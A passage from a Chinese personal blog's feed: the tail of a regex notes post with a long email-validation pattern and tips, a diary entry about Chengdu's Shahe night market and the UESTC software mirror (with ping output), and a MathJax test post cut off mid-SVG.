\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[\t]))*"(?:(?:\r\n)?[\t])*))*@(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*|(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[\t]))*"(?:(?:\r\n)?[\t])*)*\&lt;(?:(?:\r\n)?[\t])*(?:@(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*(?:,@(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*)*:(?:(?:\r\n)?[\t])*)?(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[\t]))*"(?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[\t]))*"(?:(?:\r\n)?[\t])*))*@(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*\&gt;(?:(?:\r\n)?[\t])*)(?:,\s*(?:(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[\t]))*"(?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[\t]))*"(?:(?:\r\n)?[\t])*))*@(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*|(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[\t]))*"(?:(?:\r\n)?[\t])*)*\&lt;(?:(?:\r\n)?[\t])*(?:@(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*(?:,@(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*)*:(?:(?:\r\n)?[\t])*)?(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[\t]))*"(?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|"(?:[^\"\r\\]|\\.|(?:(?:\r\n)?[\t]))*"(?:(?:\r\n)?[\t])*))*@(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*)(?:\.(?:(?:\r\n)?[\t])*(?:[^()&lt;&gt;@,;:\\".\[\]\000-\031]+(?:(?:(?:\r\n)?[\t])+|\Z|(?=[\["()&lt;&gt;@,;:\\".\[\]]))|\[([^\[\]\r\\]|\\.)*\](?:(?:\r\n)?[\t])*))*\&gt;(?:(?:\r\n)?[\t])*))*)?;\s*)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>我反正看不懂</p>
<h2 id="一些坑">一些坑</h2>
<ol type="1">
<li>很多支持正则表达式的地方差异很大，有的甚至不支持完整的正则表达式，比如linux命令中grep，只支持Basic RegEx，像<code>? + () |</code>这种元字符全都不支持，需要用<code>-e</code>或<code>-P</code>参数使用扩展的正则或直接用Perl正则。Vim里面的正则也自己搞了一套，跟别的不太一样</li>
<li>win下面的空格和换行和linux下面不一样</li>
<li>懒惰匹配基本大部分正则库都是向后的，双向的懒惰匹配并没法用，比如<code>&lt;p&gt;.*?主诉.*?&lt;/p&gt;</code>并不能找出包含主诉的段落，实际上会找出从第一个p到包含主诉那个段落结束</li>
</ol>
<h2 id="参考">参考</h2>
<ol type="1">
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3ppaXNoYW5lZC9sZWFybi1yZWdleC9ibG9iL21hc3Rlci90cmFuc2xhdGlvbnMvUkVBRE1FLWNuLm1k">https://github.com/ziishaned/learn-regex/blob/master/translations/README-cn.md<i class="fa fa-external-link-alt"></i></span> 一个简短教程</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9yZWdleDEwMS5jb20v">https://regex101.com/<i class="fa fa-external-link-alt"></i></span> 在线练习和测试网站</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9yZWdleHIuY29tLw==">https://regexr.com/<i class="fa fa-external-link-alt"></i></span> 另一个网站，感觉功能比上面那个强，但只支持javascript和php</li>
</ol>
<h2 id="其他">其他</h2>
<p>等待填坑</p>
]]></content>
      <categories>
        <category>笔记&amp;札记</category>
      </categories>
      <tags>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title>沙河夜市</title>
    <url>/f641/</url>
    <content><![CDATA[<p>这几天走过泥电沙河边上的建设路，早上晨光熹微，夜间车马喧嚣，仿佛回到了高二高三在一中上学的日子。 <a id="more"></a> 晚上路过建设路，卖小吃的沿街店铺生意似乎很火爆。到底还是网红街，比清水河西门外一片濒临倒闭的冷清店铺红火多了，显不出一点稳中向好共克时艰的样子。然而我这几天却没看到多少麻雀在路边找吃的，可能是人实在太多不太敢来吧。沙河校内倒是有些珠颈斑鸠和白颊噪鹛在路边捡樟树果子吃。鸟没看到，不到一周的时间却见了三次老鼠行色匆匆，穿梭在摊位间，可能是要回家养四个龟 不喜欢辣的我路过建设路，没有胃口，每次大晚上的走过去居然一点也不饿。</p>
<p>今天实习回来的师姐请我们吃螺蛳粉，不习惯嗦粉并不知道哪里好吃。 听说建设路吃的自从炒作过度就不如以前了，我也不晓得，反正没有市井气息，像旅游区。看那个某签签土豆每天都有那么多人在排队，我就好奇一个土豆到底有什么好吃的。反正去了西伯利亚，天天都有土豆吃。 这些跟我一个低端人口又有什么关系呢 浮世繁华，与我无关。 16年涨了房价的成都不像是那首不知道怎么火的《成都》，倒像是《北京北京》。 咖啡馆离广场有三个街区，仿佛霓虹灯到月亮的距离，哦，不对，成都看不到月亮。</p>
<p>晚上回到租的房子，八二信箱家属区，老房子刷了一层屎黄色的漆，那感觉，和当年我长大的物探小区刷了一层红色的漆一样难受。我果然还是喜欢老小区。</p>
<p>成都夜雨，点点滴滴到天明</p>
<p><strong><em>对了，泥电的镜像源要上了，不来试试吗</em></strong> <span class="exturl" data-url="aHR0cDovL21pcnJvcnMudWVzdGMuY24=">电子科技大学开源镜像站<i class="fa fa-external-link-alt"></i></span> ~~202.115.22.207 ~~（需要校内IP） 电子科大镜像源自从凝聚的凉了以后终于要续上了</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">ping</span> <span class="token number">202.115</span>.22.207

正在 Ping <span class="token number">202.115</span>.22.207 具有 <span class="token number">32</span> 字节的数据:
来自 <span class="token number">202.115</span>.22.207 的回复: 字节<span class="token operator">=</span><span class="token number">32</span> 时间<span class="token operator">=</span>2ms <span class="token assign-left variable">TTL</span><span class="token operator">=</span><span class="token number">60</span>
来自 <span class="token number">202.115</span>.22.207 的回复: 字节<span class="token operator">=</span><span class="token number">32</span> 时间<span class="token operator">&lt;</span>1ms <span class="token assign-left variable">TTL</span><span class="token operator">=</span><span class="token number">60</span>
来自 <span class="token number">202.115</span>.22.207 的回复: 字节<span class="token operator">=</span><span class="token number">32</span> 时间<span class="token operator">=</span>1ms <span class="token assign-left variable">TTL</span><span class="token operator">=</span><span class="token number">60</span>
来自 <span class="token number">202.115</span>.22.207 的回复: 字节<span class="token operator">=</span><span class="token number">32</span> 时间<span class="token operator">&lt;</span>1ms <span class="token assign-left variable">TTL</span><span class="token operator">=</span><span class="token number">60</span>

<span class="token number">202.115</span>.22.207 的 Ping 统计信息:
    数据包: 已发送 <span class="token operator">=</span> <span class="token number">4</span>，已接收 <span class="token operator">=</span> <span class="token number">4</span>，丢失 <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">(</span><span class="token number">0</span>% 丢失<span class="token punctuation">)</span>，
往返行程的估计时间<span class="token punctuation">(</span>以毫秒为单位<span class="token punctuation">)</span>:
    最短 <span class="token operator">=</span> 0ms，最长 <span class="token operator">=</span> 2ms，平均 <span class="token operator">=</span> 0ms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/mirrors.png" alt="Picture" style="zoom:80%;" /> <em>请忽略现在还妹有前端这个问题，据说已经在做了.jpg</em></p>
<p>更新，前端已经安排上了 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/mirrors1.png" alt="Picture" style="zoom:80%;" /></p>
]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
  </entry>
  <entry>
    <title>测试</title>
    <url>/938d/</url>
    <content><![CDATA[<p><img width="200" src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/ripper%20shark1s.jpg"> <a id="more"></a></p>
<p>行内公式 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex" xmlns="http://www.w3.org/2000/svg" width="7.924ex" height="1.805ex" role="img" focusable="false" viewBox="0 -716 3502.6 798"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(806.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(1862.6, 0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mi" transform="translate(2291.6, 0)"><path data-c="26" d="M156 540Q156 620 201 668T302 716Q354 716 377 671T401 578Q401 505 287 386L274 373Q309 285 416 148L429 132L437 142Q474 191 543 309L562 341V349Q562 368 541 376T498 385H493V431H502L626 428Q709 428 721 431H727V385H712Q688 384 669 379T639 369T618 354T603 337T591 316T578 295Q537 223 506 176T464 117T454 104Q454 102 471 85T497 62Q543 24 585 24Q618 24 648 48T682 113V121H722V112Q721 94 714 75T692 32T646 -7T574 -22Q491 -19 414 42L402 51L391 42Q312 -22 224 -22Q144 -22 93 25T42 135Q42 153 46 169T55 197T74 225T96 249T125 278T156 308L195 347L190 360Q185 372 182 382T174 411T165 448T159 491T156 540ZM361 576Q361 613 348 646T305 679Q272 679 252 649T232 572Q232 497 255 426L259 411L267 420Q361 519 361 576ZM140 164Q140 103 167 64T240 24Q271 24 304 36T356 61T374 77Q295 156 235 262L220 292L210 310L193 293Q177 277 169 268T151 229T140 164Z"></path></g><g data-mml-node="mi" transform="translate(3069.6, 0)"><path data-c="1D450" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path></g></g></g></svg></mjx-container></span>.</p>
<p><span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.148ex" xmlns="http://www.w3.org/2000/svg" width="31.466ex" height="5.564ex" role="img" focusable="false" viewBox="0 -1509.9 13907.9 2459.4"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mfrac"><g data-mml-node="mrow" transform="translate(220, 676)"><g data-mml-node="mi"><path data-c="1D715" d="M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z"></path></g><g data-mml-node="mi" transform="translate(566, 0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mrow" transform="translate(325.5, -686)"><g data-mml-node="mi"><path data-c="1D715" d="M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z"></path></g><g data-mml-node="mi" transform="translate(566, 0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path></g></g><rect width="1338" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(1855.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(2911.6, 0)"><g data-mml-node="mi"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path></g><g data-mml-node="mn" transform="translate(576, 413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mrow" transform="translate(3891.1, 0)"><g data-mml-node="mo"><path data-c="28" d="M701 -940Q701 -943 695 -949H664Q662 -947 636 -922T591 -879T537 -818T475 -737T412 -636T350 -511T295 -362T250 -186T221 17T209 251Q209 962 573 1361Q596 1386 616 1405T649 1437T664 1450H695Q701 1444 701 1441Q701 1436 681 1415T629 1356T557 1261T476 1118T400 927T340 675T308 359Q306 321 306 250Q306 -139 400 -430T690 -924Q701 -936 701 -940Z"></path></g><g data-mml-node="mfrac" transform="translate(736, 0)"><g data-mml-node="mrow" transform="translate(220, 676)"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D715" d="M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z"></path></g><g data-mml-node="mn" transform="translate(617.8, 363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mi" transform="translate(1021.3, 0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mrow" transform="translate(245.9, -719.9)"><g data-mml-node="mi"><path data-c="1D715" d="M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z"></path></g><g data-mml-node="msup" transform="translate(566, 0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(572, 289) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g><rect width="1793.3" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(2991.5, 0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mfrac" transform="translate(3991.7, 0)"><g data-mml-node="mrow" transform="translate(220, 676)"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D715" d="M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z"></path></g><g data-mml-node="mn" transform="translate(617.8, 363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mi" transform="translate(1021.3, 0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mrow" transform="translate(286.9, -719.9)"><g data-mml-node="mi"><path data-c="1D715" d="M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 